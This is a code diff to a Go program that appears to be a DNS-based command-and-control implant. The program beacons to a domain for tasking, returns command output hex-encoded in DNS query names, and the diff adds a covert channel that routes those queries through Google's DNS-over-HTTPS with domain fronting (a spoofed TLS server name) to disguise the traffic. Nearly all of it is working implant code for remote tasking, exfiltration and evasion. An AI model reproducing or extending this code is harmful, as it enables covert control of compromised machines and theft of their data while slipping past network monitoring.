@@ -12,11 +12,15 @@ package main
 import (
 	"bytes"
 	"context"
+	"crypto/tls"
+	"encoding/json"
+	"errors"
 	"flag"
 	"fmt"
 	"log"
 	"math/rand"
 	"net"
+	"net/http"
 	"os"
 	"os/exec"
 	"runtime"
@@ -36,10 +40,30 @@ const (
 	DEFANGALPHABET = "abcdefghijklmnopqrstuvwxyz" +
 		"ABCDEFGHIJKLMNOPQRSTUVWXYZ" +
 		"0123456789 \n"
+
+	// DOHPREFIX holds the prefix for a DOH request
+	DOHPREFIX = "https://dns.google.com/resolve?type=TXT&name="
 )
 
-// COUNTER is used to prevent caching
-var COUNTER = uint64(0)
+var (
+	// COUNTER is used to prevent caching
+	COUNTER = uint64(0)
+
+	/* query makes a request for the label in o, of the given type t ("t"
+	or "o"), for the given ID, to the given name.  len bytes will be
+	sent at once. */
+	query func(o []byte, t, id, domain string, len int) []string
+)
+
+/* googleResponse holds a DoH response from google */
+type googleResponse struct {
+	Status  int  `json:"Number"`
+	TC      bool `json:"TC"` /* Truncated */
+	Answers []struct {
+		Name string `json:"Name"`
+		Data string `json:"Data"`
+	} `json:"Answer"`
+}
 
 func main() {
 	log.SetOutput(os.Stderr)
@@ -94,6 +118,11 @@ func main() {
 			31,
 			"Send at most `N` payload bytes per request",
 		)
+		dohDomain = flag.String(
+			"google-doh",
+			"",
+			"Use Google's DNS over HTTP, fronted to `domain`",
+		)
 	)
 	flag.Usage = func() {
 		fmt.Fprintf(
@@ -142,6 +171,13 @@ Options:
 		os.Exit(3)
 	}
 
+	/* Work out whether to do normal DNS or DoH */
+	if "" == *dohDomain {
+		query = queryDNS
+	} else {
+		query = queryDF(*dohDomain)
+	}
+
 	/* Print the ID we're using.  In the case of a random ID, this is not
 	predictable. */
 	log.Printf("ID: %v", *id)
@@ -149,7 +185,7 @@ Options:
 	st := *bMin /* Sleep time */
 	for {
 		/* Check for tasking */
-		tasking := getTasking(*id, *domain)
+		tasking := getTasking(*id, *domain, *exfilLen)
 		/* If we have it, do it and send the output back, don't sleep
 		so long next time */
 		if "" != tasking {
@@ -243,20 +279,18 @@ func randomID() string {
 
 /* getTasking beacons to the domain to try to get tasking.  It returns the
 empty string if there was none. */
-func getTasking(id, domain string) string {
-	/* Query to send for tasking */
-	d := fmt.Sprintf("0.%v.t.%v.%v", COUNTER, id, domain)
-	COUNTER++
-
+func getTasking(id, domain string, exfilLen int) string {
 	/* Try to get a text tasking */
-	txts, err := net.LookupTXT(d)
-	if nil != err && !strings.HasSuffix(err.Error(), "no such host") {
-		log.Printf("Error beaconing to %v: %v", d, err)
+	txts := query([]byte{'0'}, "t", id, domain, exfilLen)
+
+	/* Make sure we got tasking */
+	if 0 == len(txts) {
 		return ""
 	}
 
 	/* We should only have one text record if it's a legit tasking */
 	if 1 != len(txts) {
+		log.Printf("Too many answers for tasking: %q", txts)
 		return ""
 	}
 
@@ -320,14 +354,16 @@ func doTasking(
 	}
 
 	/* Send it back in 31-byte chunks */
-	sendBytes(o, id, domain, exfilLen)
+	query(o, "o", id, domain, exfilLen)
 }
 
-/* sendBytes sends off the contents of b in exfilLen-size chunks */
-func sendBytes(o []byte, id, domain string, exfilLen int) {
+/* createQueries splits o and turns it into a slice of DNS queries which use
+the implant ID id and domain domain. */
+func createQueries(o []byte, t, id, domain string, exfilLen int) []string {
 	var (
 		start int
 		end   int
+		qs    []string
 	)
 	for start = 0; start < len(o); start += exfilLen {
 		/* Work out end index */
@@ -336,21 +372,118 @@ func sendBytes(o []byte, id, domain string, exfilLen int) {
 			end = len(o)
 		}
 		/* Exfil request name */
-		n := fmt.Sprintf(
-			"%02x.%v.o.%v.%v",
+		qs = append(qs, fmt.Sprintf(
+			"%02x.%v.%v.%v.%v",
 			o[start:end],
 			COUNTER,
+			t,
 			id,
 			domain,
-		)
+		))
 		COUNTER++
-		if _, err := net.LookupIP(n); nil != err && !strings.HasSuffix(
+	}
+
+	return qs
+}
+
+/* queryDNS sends off the contents of b in exfilLen-size chunks */
+func queryDNS(o []byte, t, id, domain string, exfilLen int) []string {
+	var as []string
+	for _, q := range createQueries(o, t, id, domain, exfilLen) {
+		a, err := net.LookupTXT(q)
+		if nil != err && !strings.HasSuffix(
 			err.Error(),
 			"no such host",
 		) {
-			log.Printf("Error (%v): %v", n, err)
+			log.Printf("Query error (%v): %v", q, err)
+		}
+		if nil != a {
+			as = append(as, a...)
 		}
 	}
+	return as
+}
+
+/* queryDF returns a function which sends bytes using dns.google.com
+fronted to a given domain. */
+func queryDF(
+	frontDomain string,
+) func([]byte, string, string, string, int) []string {
+	/* HTTP Client which fronts */
+	client := &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{
+				ServerName: frontDomain,
+			},
+		},
+	}
+
+	/* Function which does the real work */
+	return func(o []byte, t, id, domain string, exfilLen int) []string {
+		var as []string
+		for _, q := range createQueries(o, t, id, domain, exfilLen) {
+			a, err := domainFrontQuery(client, q)
+			if nil != err {
+				log.Printf("Query error (%v): %v", q, err)
+			}
+			if nil != a {
+				as = append(as, a...)
+			}
+		}
+		return as
+	}
+}
+
+/* domainFrontQuery queries google for the domain name q using the client c */
+func domainFrontQuery(c *http.Client, q string) ([]string, error) {
+	/* Request the domain */
+	res, err := c.Get(DOHPREFIX + q)
+	if nil != err {
+		return nil, err
+	}
+
+	/* Make sure we made an ok request */
+	if http.StatusOK != res.StatusCode {
+		return nil, fmt.Errorf("received %s", res.Status)
+	}
+
+	/* Get HTTP response body */
+	var b bytes.Buffer
+	n, err := b.ReadFrom(res.Body)
+	defer res.Body.Close()
+	if nil != err {
+		return nil, err
+	}
+	if 0 == n {
+		return nil, errors.New("empty body")
+	}
+
+	/* Unroll answer */
+	var a googleResponse
+	if err := json.Unmarshal(b.Bytes(), &a); nil != err {
+		return nil, err
+	}
+
+	/* Make sure it worked */
+	if 0 != a.Status {
+		return nil, fmt.Errorf("unsuccessful, status %v", a.Status)
+	}
+
+	/* Make sure we didn't get truncated */
+	if a.TC {
+		return nil, errors.New("truncated answer")
+	}
+
+	var ss []string
+	for _, s := range a.Answers {
+		d, err := strconv.Unquote(s.Data)
+		if nil != err {
+			log.Printf("Unable to unmarshal %q: %v", s.Data, err)
+			continue
+		}
+		ss = append(ss, d)
+	}
+	return ss, nil
 }
 
 /* sendRandomChars sends random characters to the server.  The number of
@@ -364,7 +497,7 @@ func sendRandomChars(count, id, domain string, exfilLen int) {
 		if !strings.HasSuffix(s, "\n") {
 			s += "\n"
 		}
-		sendBytes([]byte(s), id, domain, exfilLen)
+		query([]byte(s), "o", id, domain, exfilLen)
 		return
 	}
 
@@ -377,7 +510,7 @@ func sendRandomChars(count, id, domain string, exfilLen int) {
 		cs = append(cs, '\n')
 	}
 
-	sendBytes(cs, id, domain, exfilLen)
+	query(cs, "o", id, domain, exfilLen)
 }
 
 /* addJitter returns d varied by j, which must be a fraction between 0 and
